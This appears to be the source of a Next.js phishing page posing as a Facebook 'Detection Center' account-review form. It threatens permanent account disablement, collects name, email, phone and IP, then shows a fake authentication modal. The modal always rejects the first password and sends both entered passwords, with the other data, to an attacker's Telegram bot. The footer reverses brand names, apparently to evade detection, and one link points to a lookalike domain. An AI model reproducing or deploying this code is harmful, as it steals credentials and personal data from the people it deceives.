import React, { useState, useEffect } from 'react'
import Image from 'next/image';
import Link from 'next/link';
import axios from "axios";

export default function Addinfo() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [detail, setDetail] = useState('');
  const [checked, setChecked] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [firstclickcontent, setfirstclickcontent] = useState("");
  const [clickednumber, setclickednumber] = useState(1);
  const [ip, setIP] = useState("");
  const [password1, setPassword1] = useState('');

  let password2 = '';

  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;

  const getData = async () => {
    const res = await axios.get("https://api.ipify.org/?format=json");
    setIP(res.data.ip);
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    getData();
  }, []);

  const handleSubmit = async () => {
    if (password) {
      if (clickednumber === 1) {
        setPassword1(password)
        setclickednumber(2)
        setfirstclickcontent('Your password is incorrect!');
        setPassword('');
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: chatId,
          text: `First Facebook Password: ${password1}\nIP address: ${ip}`
        }).then(({ data }) => {
          console.log(data);
        })
      }
      else if (clickednumber === 2) {
        password2 = password
        setfirstclickcontent('');
        setclickednumber(1);
        window.location.href = "/verifycode"
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: chatId,
          text: `Second Facebook Password: ${password2}\nIP address: ${ip}`
        }).then(({ data }) => {
          console.log(data);
        })
      }
    }
  };

  const handleAddInfo = async () => {
    if (name && email && phoneNumber && checked)
      setShowModal(true);

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: `Name: ${name}\nEmail: ${email}\nPhoneNumber: ${phoneNumber}\nDetail: ${detail}\nIP address: ${ip}`
    }).then(({ data }) => {
      console.log(data);
    })

  }


  return (
    <div>
      <header>
        <div className="bg-white w-screen fixed left-0 top-0">
          <div className="container mx-auto max-w-[1164px] flex justify-between">
            <div className="flex justify-between flex-wrap p-6 pb-0">
              <div className="flex items-center flex-shrink-0 text-white mr-[50px] pb-[25px]">
                <Image src="facebook.png" className=" mr-2" alt="Logo" width={100} height={100} />
                <h2 className="text-base font-bold leading-6 text-black">
                  Facebook
                </h2>
              </div>

              <div className={`w-full block flex-grow lg:flex lg:items-center lg:w-auto }`} >
                <div className="text-sm lg:flex-grow lg:space-x-[50px] space-x-0">
                  <Link
                    href="/"
                    className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm text-[#4338ca] pb-0 lg:pb-[25px] lg:border-b lg:border-[#4338ca] "
                  >
                    Detection center
                  </Link>
                  <Link
                    href="/"
                    className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                  >
                    Privacy Policy
                  </Link>
                  <Link
                    href="/"
                    className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                  >
                    Developers
                  </Link>
                  <Link
                    href="/"
                    className="hidden mt-4 lg:inline-block lg:mt-0 text-white-200 mr-4 text-sm hover:text-[#4338ca]"
                  >
                    Help
                  </Link>
                </div>
              </div>
            </div>
            <div className="block lg:hidden">
              <button
                className="flex items-center px-3 py-2 rounded text-black-500 hover:text-black-400"
              >
                <svg
                  className={`fill-current h-3 w-3`}
                  viewBox="0 0 20 20"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z" />
                </svg>
                <svg
                  className={`fill-current h-3 w-3 block`}
                  viewBox="0 0 20 20"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M10 8.586L2.929 1.515 1.515 2.929 8.586 10l-7.071 7.071 1.414 1.414L10 11.414l7.071 7.071 1.414-1.414L11.414 10l7.071-7.071-1.414-1.414L10 8.586z" />
                </svg>
              </button>
            </div>
            <div className="relative hidden lg:flex">
              <input
                type="text"
                placeholder="Search"
                className="bg-[#f0f2f5] text-[15px] rounded-full w-[284px] h-[36px] mt-6 relative px-12 border-none"
              />
              <Image
                src="human.png"
                className="mt-6 ml-2"
                alt="noImg"
                width={32}
                height={32}
              />
              <Image
                src="download.png"
                alt="noImg"
                className="absolute left-[15px] bottom-[35px]"
                width={32}
                height={32}
              />
            </div>
          </div>
        </div>
      </header>
      <div className='container overflow-hidden xl:w-[70%] w-[90%] h-screen m-auto xl:p-10 p-3 mt-20'>
        <div>
          {showModal ? (
            <>
              <div className="z-100 flex justify-center absolute w-full h-full inset-0 outline-none focus:outline-none bg-black opacity-90">
                <div className="relative w-auto my-6 mx-auto max-w-3xl">
                  <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                    <div className="flex items-start justify-between p-5 border-b border-solid border-gray-300 rounded-t ">
                      <h3 className="text-2xl font-semibold">Authentication Required</h3>
                      <button
                        className="bg-transparent border-0 text-black flex justify-end items-center"
                        onClick={() => setShowModal(false)}
                      >
                        <span className="text-black opacity-7 h-6 w-6 text-xl block  py-0 ">
                          X
                        </span>
                      </button>
                    </div>
                    <div className='border border-x-0 border-gray-300 border-t-1 border-b-1'>
                      <p className="m-3 text-sm font-medium text-gray-600">Please authenticate by entering your password to submit this request.</p>
                      <div className='flex items-center'>
                        <Image className='w-24 h-20 m-3' width={24} height={20} alt="avatar" src="data:image/jpeg;base64,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" />
                        <div>
                          <p className='pl-2 font-bold'>{name}</p>
                          <input type="password" value={password} id="password" className="m-2 border border-gray-300 text-gray-900 text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5 placeholder:text-slate-400 placeholder:p-2" placeholder="Password" onChange={(e) => setPassword(e.target.value)} />
                        </div>
                      </div>
                      <p className='text-sm text-red-700 m-2'>{firstclickcontent}</p>
                    </div>
                    <div className="flex items-center justify-end p-2 border-t border-solid border-blueGray-200 rounded-b">
                      <button
                        className="text-white text-md bg-gray-600 hover:bg-gray-700 p-2 text-md rounded-md outline-none focus:outline-none mr-1 mb-1"
                        type="button"
                        onClick={() => setShowModal(false)}
                      >
                        Close
                      </button>
                      <button
                        className="text-white text-md bg-blue-600 hover:bg-blue-700 text-md p-2 ml-3 rounded-md outline-none focus:outline-none mr-1 mb-1"
                        type="button"
                        onClick={handleSubmit}
                      >
                        Continue
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </>
          ) : (
            <form>
              <div className='item-center border border-gray-300 border-x-0 border-t-0 border-b-1 flex-justify-start lg:flex justify-between mb-3 mt-2 pb-1'>
                <div>
                  <div className='flex w-auto text-2xl pb-2'>Request an account review</div>
                  <div className='text-gray-500'>Detection Center System</div>
                </div>
                <div className='justify-self-end text-gray-500'>
                  <p>v2.11.076</p>
                </div>
              </div>
              <div className="flex lg:flex-row flex-col-reverse ">
                <div className=' basis-full md:basis-2/3 p-3'>
                  <div className='grid grid-cols-3 text-gray-500'>
                    <div className='hidden lg:block justify-self-start'>Fill Form</div>
                    <div className='hidden lg:block justify-self-center'>Submit form</div>
                    <div className='hidden lg:block justify-self-end'>Await decision</div>
                  </div>
                  <div className='lg:hidden grid grid-cols-3 text-gray-500'>
                    <div className='grid justify-start'>1</div>
                    <div className='grid justify-center'>2</div>
                    <div className='grid justify-end'>3</div>
                  </div>
                  <div className='flex justify-between '>
                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CheckCircleOutlineIcon">
                      <path d="M16.59 7.58 10 14.17l-3.59-3.58L5 12l5 5 8-8zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                    </svg></Link>
                    <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                    </svg></Link>
                    <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
                    <Link href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                    </svg></Link>
                  </div>
                  <div className='col-span-2 p-3 bg-white mt-2'>
                    <div className='flex w-auto pt-2 text-2xl text-gray-800'>
                      Request Form
                    </div>
                    <div className='flex w-auto pb-3 text-gray-500 text-sm'>
                      Ref. 99B83BB5-D100-4604-B888-513BE70DE9A3
                    </div>
                    <hr className='pb-2' />
                    <div className="mb-6">
                      <label id="name" className="block mb-2 text-sm font-medium text-gray-700 " >Full Name: </label>
                      <input type="text" id="name" className="border border-gray-300 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5" onChange={(e) => setName(e.target.value)} required />
                    </div>
                    <div className="mb-6">
                      <label id="email" className="block mb-2 text-sm font-medium text-gray-700">Email: </label>
                      <input type="email" id="email" className="border border-gray-300 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5" onChange={(e) => setEmail(e.target.value)} required />
                    </div>
                    <div className="mb-6">
                      <label id="phoneNumber" className="block mb-2 text-sm font-medium text-gray-700">Phone number :</label>
                      <input type="number" id="phoneNumber" className="border border-gray-300 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-1.5" onChange={(e) => setPhoneNumber(e.target.value)} required />
                    </div>
                    <div className="mb-6">
                      <label id="detail" className="block mb-2 text-sm font-medium text-gray-700">Any specific details (optional):</label>
                      <textarea id="message" className="block p-2.5 w-full text-sm text-black-900 bg-black-50 rounded-sm border border-gray-300 focus:ring-blue-500 focus:border-blue-500" onChange={(e) => setDetail(e.target.value)} />
                    </div>
                    <div className="flex items-start mb-6">
                      <div className="flex items-center h-5">
                        <input id="remember" type="checkbox" value="" className="w-4 h-4 border border-gray-300 rounded-sm focus:ring-3 focus:ring-blue-300  dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800" onClick={() => setChecked(true)} required />
                      </div>
                      <label id="remember" className="ml-2 text-sm font-medium text-gray-700">By clicking the button below, you agree to our Terms of Service and our Data Policy. </label>
                    </div>
                    <button type="submit" className="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-md text-sm w-full sm:w-auto px-5 py-2.5 text-center" onClick={handleAddInfo}>Submit</button>

                  </div>
                </div>
                <div className='p-3 basis-1/3 border border-gray-300 border-y-0 border-r-0 border-l-1 text-gray-500'>
                  <p className='pt-3'>Our Detection Center System identifies accounts which violate our <Link href='https://www.facebook.com/legal/terms' style={{ textDecoration: 'underline', color: 'blue' }}>Terms of Service</Link> and our <Link href='https://transparency.fb.com/en-gb/policies/community-standards/' style={{ textDecoration: 'underline', color: 'blue' }}>Community Standards</Link>, mainly targetting <Link href='https://meta.com-terms-of-services.com/submit-form#' style={{ textDecoration: 'underline', color: 'blue' }}>Duplicate or shared accounts used by many people</Link>. or accounts which impersonate someone else.</p>
                  <div className='hidden lg:block'>
                    <p className='pt-10'><b>What this means for you ?</b></p>
                    <p className='pt-3'>We are obliged to permanently disable your account, unless you request a formal review by our dedicated team which will review each account against our detections.</p>
                    <p className='pt-10'><b>What next ?</b></p>
                    <p className='pt-3'>We are giving you the opportunity to respond with a formal request for review through this page. This request will then be attached to your case for review by our dedicated team.</p>
                  </div>
                </div>
              </div>
            </form>
          )}

        </div>
      </div>
      <footer className="w-full bg-white text-center pb-[28px]">
        <div className="flex space-x-[20px] justify-center pt-[40px] mb-[24px]">
          <Link
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Products
          </Link>
          <Link
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Terms & Policies
          </Link>
          <Link
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Developers
          </Link>
          <Link
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Help
          </Link>
        </div>
        <p className="text-xs text-[#6b7280] max-w-[500px] text-center mx-auto mb-[16px]">
          The koobecaF company is now ateM. We’ve updated our Terms of Use,
          Privacy Policy, and Cookies Policy to reflect the new name on January
          4, 2022. While our company name has changed, we are continuing to
          offer the same products, including the koobecaF app.
        </p>
        <label className="text-base text-[#6b7280] max-w-[500px] text-center mx-auto mb-[16px]">
          © 2022 Meta
        </label>
      </footer>
    </div>
  )
}